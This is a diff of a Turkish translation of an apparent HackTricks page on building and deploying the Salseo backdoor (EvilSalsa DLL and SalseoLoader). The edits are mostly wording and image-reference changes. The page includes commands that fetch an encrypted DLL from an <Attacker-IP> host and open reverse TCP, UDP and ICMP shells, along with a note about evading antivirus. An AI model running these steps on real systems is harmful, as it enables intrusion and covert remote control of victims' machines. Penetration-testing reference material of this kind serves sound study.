@@ -6,33 +6,33 @@
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* [**The PEASS Family**]'yi keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**] koleksiyonumuz (https://opensea.io/collection/the-peass-family)
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.
 
 </details>
 
 ## Derlemeleri Derleme
 
-Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
+Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekecektir.
 
-Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64 destekliyorsa, bu mimari için derleyin).
+Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64'ü destekliyorsa, o mimari için derleyin).
 
 Mimariyi Visual Studio içinde **sol "Build" sekmesindeki** **"Platform Target"** bölümünden **seçebilirsiniz.**
 
-(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"** seçeneğine tıklayın)
+(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)
 
-![](<../.gitbook/assets/image (836).png>)
+![](<../.gitbook/assets/image (839).png>)
 
 Sonra, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):
 
-![](<../.gitbook/assets/image (378).png>)
+![](<../.gitbook/assets/image (381).png>)
 
 ## Arka Kapıyı Hazırlama
 
-İlk olarak, **EvilSalsa.dll**'yi kodlamalısınız. Bunu yapmak için **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
+Öncelikle, **EvilSalsa.dll**'yi şifrelemeniz gerekecektir. Bunun için, **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
 ```
@@ -44,7 +44,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Tamam, şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **şifrelenmiş EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası.**
+Şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **şifrelenmiş EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası.**
 
 **SalseoLoader.exe ikili dosyasını makineye yükleyin. Herhangi bir AV tarafından tespit edilmemeleri gerekiyor...**
 
@@ -52,17 +52,17 @@ Tamam, şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her ş
 
 ### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP aracılığıyla indirme)**
 
-Ters kabuk dinleyici olarak nc başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
+Ters kabuk dinleyici olarak nc'yi başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
 ### **Bir UDP ters kabuk almak (SMB üzerinden kodlanmış dll indirme)**
 
-Ters kabuk dinleyicisi olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
+Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **ICMP ters kabuk almak (kodlanmış dll zaten kurbanın içinde)**
+### **ICMP ters kabuk almak (şifrelenmiş dll zaten kurbanın içinde)**
 
 **Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -85,19 +85,19 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Visual Studio kullanarak SalseoLoader projesini açın.
 
-### Ana işlevden önce ekle: \[DllExport]
+### Ana işlevin önüne ekle: \[DllExport]
 
-![](<../.gitbook/assets/image (405).png>)
+![](<../.gitbook/assets/image (409).png>)
 
 ### Bu projeye DllExport yükleyin
 
 #### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm İçin NuGet Paketlerini Yönet...**
 
-![](<../.gitbook/assets/image (878).png>)
+![](<../.gitbook/assets/image (881).png>)
 
 #### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi seçin (ve açılan pencereyi kabul edin)**
 
-![](<../.gitbook/assets/image (97).png>)
+![](<../.gitbook/assets/image (100).png>)
 
 Projeler klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünecektir.
 
@@ -105,35 +105,35 @@ Projeler klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosya
 
 **Kaldır**'ı seçin (evet, tuhaf ama bana güvenin, gerekli)
 
-![](<../.gitbook/assets/image (94).png>)
+![](<../.gitbook/assets/image (97).png>)
 
 ### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın
 
 Sadece Visual Studio'yu **kapatın**
 
-Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın
+Daha sonra, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın
 
-**x64**'ü seçin (eğer x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı seçin (**DllExport için Namespace**) ve **Uygula**'yı seçin
+**x64**'ü seçin (bir x64 kutusunda kullanacaksanız), **System.Runtime.InteropServices**'i seçin (**DllExport için Namespace** içinde) ve **Uygula**'yı seçin
 
-![](<../.gitbook/assets/image (879).png>)
+![](<../.gitbook/assets/image (882).png>)
 
 ### Projeyi tekrar Visual Studio ile açın
 
 **\[DllExport]** artık hata olarak işaretlenmemelidir
 
-![](<../.gitbook/assets/image (667).png>)
+![](<../.gitbook/assets/image (670).png>)
 
 ### Çözümü derleyin
 
-**Çıkış Türü = Sınıf Kitaplığı**'nı seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıkış türü = Sınıf Kitaplığı)
+**Çıkış Türü = Sınıf Kütüphanesi**'ni seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıkış türü = Sınıf Kütüphanesi)
 
-![](<../.gitbook/assets/image (844).png>)
+![](<../.gitbook/assets/image (847).png>)
 
 **x64 platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)
 
-![](<../.gitbook/assets/image (282).png>)
+![](<../.gitbook/assets/image (285).png>)
 
-Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolunu göreceksiniz)
+Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
 
 ### Oluşturulan Dll'yi test edin
 
@@ -176,9 +176,9 @@ rundll32.exe SalseoLoader.dll,main
 HackTricks'ı desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
